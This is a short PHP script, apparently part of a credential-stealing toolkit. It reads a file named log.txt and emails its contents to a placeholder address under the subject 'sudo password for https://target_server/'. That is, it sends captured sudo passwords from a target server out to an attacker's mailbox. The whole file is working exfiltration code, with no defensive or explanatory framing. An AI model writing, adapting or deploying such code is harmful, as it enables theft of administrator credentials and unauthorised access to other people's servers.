<?php

$to = "youremail@mail.com";

$subject = 'sudo password for https://target_server/';


$message = file_get_contents("log.txt");

mail($to, $subject, $message);

?>
